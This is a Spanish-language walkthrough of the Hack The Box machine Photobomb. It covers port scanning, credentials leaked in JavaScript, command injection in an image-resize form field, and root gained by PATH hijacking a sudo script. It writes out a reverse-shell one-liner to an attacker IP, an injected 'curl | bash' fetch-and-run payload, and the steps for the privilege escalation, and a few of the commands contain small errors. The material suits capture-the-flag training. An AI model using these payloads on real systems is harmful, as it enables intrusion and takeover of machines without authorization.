---
layout: post
title: Photobomb
description: Máquina de Hack The Box en donde se explota una vulnerabiliad de inyección de comandos, y se hace PATH hijacking para obtner privilegios de super usuario.
image: ""
category: maquina
tags: [maquinas, linux, hackthebox, easy, pentesting, path_hijacking, inyeccion]
comments: false
edit_url: false
toc: true
---

# Photobomb Walkthrough

[Enlace a la máquina](https://app.hackthebox.com/machines/500)

## Reconocimiento
Empezaremos con un reconocimiento de los puertos usando nmap.
```shell-session
$ nmap -Pn -n --min-rate 5000 -p- -sS -vvv -oN all_ports 10.10.11.182
Nmap scan report for 10.10.11.182  
Host is up, received user-set (0.079s latency).  
Scanned at 2023-07-26 09:26:36 CST for 13s  
Not shown: 65533 closed tcp ports (reset)  
PORT   STATE SERVICE REASON  
22/tcp open  ssh     syn-ack ttl 63  
80/tcp open  http    syn-ack ttl 63  
  
Read data files from: /usr/bin/../share/nmap  
# Nmap done at Wed Jul 26 09:26:49 2023 -- 1 IP address (1 host up) scanned in 13.75 seconds
```

Ahora, vamos a lanzar un escaneo más a detalle sobre el puerto `80` y el `22`.

```shell-session
$ nmap -p 22,80 -sC -sV -Pn -n -oN targeted 10.10.11.182
Nmap scan report for 10.10.11.182
Host is up (0.081s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e22473bbfbdf5cb520b66876748ab58d (RSA)
|   256 04e3ac6e184e1b7effac4fe39dd21bae (ECDSA)
|_  256 20e05d8cba71f08c3a1819f24011d29e (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://photobomb.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Jul 26 09:28:00 2023 -- 1 IP address (1 host up) scanned in 16.54 seconds
```


### Página web
Al parecer tenemos una página web llamada `photobomb.htb`, vamos a escribir la `ip` de la máquina en el navegador.
![image](/assets/images/maquinas/Pasted image 20230727085142.png)

El servidor nos indica que hay un sitio con dirección `photobomb.htb` pero no lo está resolviendo, por lo que vamos a agregar la dirección a nuestra lista de hosts:
```shell-session
$ echo "10.10.11.182 photobomb.htb" | sudo tee -a /etc/hosts  
```

Ahora, si recargamos la página, ya podemos ver el sitio `photobomb.htb`:
![image](/assets/images/maquinas/Pasted image 20230727085450.png)

El único enlace que se nos presenta nos abre un dialogo de acceso, de la cual no pasamos tratando de adivinar las credenciales. Si damos en cancelar, nos redirige a la ruta `/printer` con error `401`.

![image](/assets/images/maquinas/Pasted image 20230727090009.png)

#### Código fuente
Vamos a ver el código fuente de la página, a veces hay cosas interesantes ahí.
![image](/assets/images/maquinas/Pasted image 20230727090404.png)

Podemos ver que hay un script en la línea 6 llamado `photobomb.js`, vamos a ver qué se esconde ahí.

```js
function init() {
  // Jameson: pre-populate creds for tech support as they keep forgetting them and emailing me
  if (document.cookie.match(/^(.*;)?\s*isPhotoBombTechSupport\s*=\s*[^;]+(.*)?$/)) {
    document.getElementsByClassName('creds')[0].setAttribute('href','http://pH0t0:b0Mb!@photobomb.htb/printer');
  }
}
window.onload = init;
```

Al parecer, lo que hace este script es dar el ingreso a los usuarios que tengan una cookie llamada _isPhotoBombTechSupport_, y los redirige a una url con las credenciales de acceso en ella. Así que podemos ir nosotros a esa misma url, o ingresar `pH0t0` como usuario y `b0Mb!` como contraseña.

![image](/assets/images/maquinas/Pasted image 20230727091021.png)

#### Printer
Y tenemos acceso a `/printer`. La funcionalidad de esta página parece ser para re escalar imágenes que luego podemos descargar para imprimir, de hecho si seleccionamos una imagen y un tamaño, podemos descargar la imagen a nuestro equipo.

![image](/assets/images/maquinas/Pasted image 20230727091159.png)

Una de las cosas que observé fue que la primera vez que seleccionas una resolución diferente a la que está por default, la página tarda un poco en tener lista la descarga, pero la segunda vez que solicitas la imagen es inmediata la descarga, sospecho que se trata de un re escalamiento por medio de un comando, que tarda unos segundos en procesar la imagen al tamaño deseado, y guarda las copias temporalmente.

### Burp Suite

Vamos a usar el proxy de Burp Suite para ver las peticiones que se están enviando.
![image](/assets/images/maquinas/Pasted image 20230727091704.png)

Y una vez tengamos la petición, la mandamos al Repeater.

![image](/assets/images/maquinas/Pasted image 20230727091857.png)

Observamos tres campos que se están mandando:
1. El nombre de la imagen
2. El tipo
3. Y las dimensiones

Puede ser que en el servidor se esté ejecutando un comando que utilice esos 3 argumentos para generar la imagen, algo así como:
```shell-session
$ resize -n "mark-mc-neill-4xWHIpY2QcY-unsplash.jpg" -t "jpg" -s "30x20"
```

Esto no nos permitiría inyectar comandos, porque lo que introduzcamos estaría siendo tomado como cadena, pero si el comando luce más como:
```shell-session
$ resize -n mark-mc-neill-4xWHIpY2QcY-unsplash.jpg -t jpg -s 30x20
```

Habría una vulnerabilidad a inyección de comandos, por lo que si introducimos un `;` muy probablemente causaremos un error en el proceso. Probemos uno por uno.

El único campo que parece ser vulnerable es el `filetype`, cuando insertamos un punto y coma, el servidor tarda en responder y finalmente nos dice que *falló en generar una copia de la imagen*, diferente a la respuesta que obteníamos con los otros campos.

![image](/assets/images/maquinas/Pasted image 20230727093219.png)

Pero para estar seguros insertemos un comando que nos pueda dar una señal de que se está ejecutando, pues no obtendremos respuesta en formato de texto. Usemos `sleep`, si se ejecuta conseguiremos que el servidor tarde `x` tiempo en responder. Inyectemos `;sleep+15` (el `+` sustituye al espacio).

Y efectivamente, el servidor tarda > 15 segundos en responder. Tenemos una inyección de comandos.

---
## Ataque
Con esta vulnerabilidad deberíamos buscar una reverse shell que nos deje entrar al equipo. 

### Reverse shell
#### Script para la reverse
Vamos a crear un archivo `index.html` que podamos servir a través de un servidor `http`, y que contenga el script para la reverse shell:
```html
bash -c "bash -i >& /dev/tcp/10.10.14.13/4040 0>&1"
```

#### Servidor http
En el directorio donde se encuentra `index.html` vamos a ejecutar:
```shell-session
$ python -c http.server 80
```

#### nc
Y vamos a escuchar a conexiones entrantes con `nc`:
```shell-session
$ nc -nlvp 4040
```

![image](/assets/images/maquinas/Pasted image 20230727094651.png)

#### Inyección
Es momento de inyectar el comando que nos de la reverse shell: `;curl+10.10.14.10+|+bash`.

![image](/assets/images/maquinas/Pasted image 20230727095256.png)

Tenemos una reverse, ahora faltaría acondicionarla.

### Primer bandera
La encontramos en nuestro directorio home.
![image](/assets/images/maquinas/Pasted image 20230727100105.png)

---
## Escalamiento
Veamos si tenemos algún permiso como `sudo` o estamos en algún grupo privilegiado.

```shell-session
$ id  
uid=1000(wizard) gid=1000(wizard) groups=1000(wizard)  
$ sudo -l  
Matching Defaults entries for wizard on photobomb:  
   env_reset, mail_badpass,  
   secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin  
  
User wizard may run the following commands on photobomb:  
   (root) SETENV: NOPASSWD: /opt/cleanup.sh
```

Ningún grupo importante, pero vemos que podemos ejecutar el script `cleanup.sh` como root sin utilizar contraseña (`NOPASSWD`) y conservando nuestro `PATH` (`SETENV`). Lo que ya nos da una idea de **PATH hijacking**. Pero veamos el script `cleanup.sh`:

```bash
#!/bin/bash  
. /opt/.bashrc  
cd /home/wizard/photobomb  
  
# clean up log files  
if [ -s log/photobomb.log ] && ! [ -L log/photobomb.log ]  
then  
 /bin/cat log/photobomb.log > log/photobomb.log.old  
 /usr/bin/truncate -s0 log/photobomb.log  
fi  
  
# protect the priceless originals  
find source_images -type f -name '*.jpg' -exec chown root:root {} \;
```

Este script carga su configuración de un `.bashrc` ubicado en el mismo directorio y luego hace una copia del `photobomb.log`, por último, con `find` protege las imágenes originales.

Revisemos `.bashrc`:

```shell-session
# System-wide .bashrc file for interactive bash(1) shells.  
  
# To enable the settings / commands in this file for login shells as well,  
# this file has to be sourced in /etc/profile.  
  
# Jameson: ensure that snaps don't interfere, 'cos they are dumb  
PATH=${PATH/:\/snap\/bin/}  
  
# Jameson: caused problems with testing whether to rotate the log file  
enable -n [ # ]  
  
# If not running interactively, don't do anything  
[ -z "$PS1" ] && return  
  
# check the window size after each command and, if necessary,  
# update the values of LINES and COLUMNS.  
shopt -s checkwinsize  
  
-- SNIP --
```

Ninguno de estos dos archivos tiene permisos de escritura, por lo que debe haber una forma de ganar acceso al `root` **con solamente ejecutarlos**. Algo raro que se hace en `.bashrc` es lo que está en la _línea 10_: `enable -n [`, lo que esto hace es deshabilitar el comando `[` (sí, el corchete es un comando).

![image](/assets/images/maquinas/Pasted image 20230727103119.png)

Así que, cuando se ejecuta el script `cleanup.sh`, el binario `[` nativo no será ejecutado, dándonos oportunidad de especificar la ruta de un binario con el mismo nombre, pero que nos sea más útil.

### Ejecutable malicioso
Creemos un ejecutable llamado `[` que será el que se ejecute cuando lancemos el script como **root**. Su contenido será una simple llamada a una `bash`, que se ejecutará bajo el mismo usuario que el script, es decir, **root**.

```shell-session
$ cd /tmp
$ cat > [
bash
^C
$ chmod +x [
```

Ahora, lo que queda hacer es lanzar el script **incluyendo en el `PATH`** la ruta de nuestro ejecutable malicioso en primer lugar para garantizar que se ejecute antes de cualquier otro binario con el mismo nombre:

```shell-session
$ sudo PATH=/tmp:$PATH /opt/cleanup.sh
```

### Segunda bandera
Boom. Tenemos una bash como usuario root.

![image](/assets/images/maquinas/Pasted image 20230727104551.png)

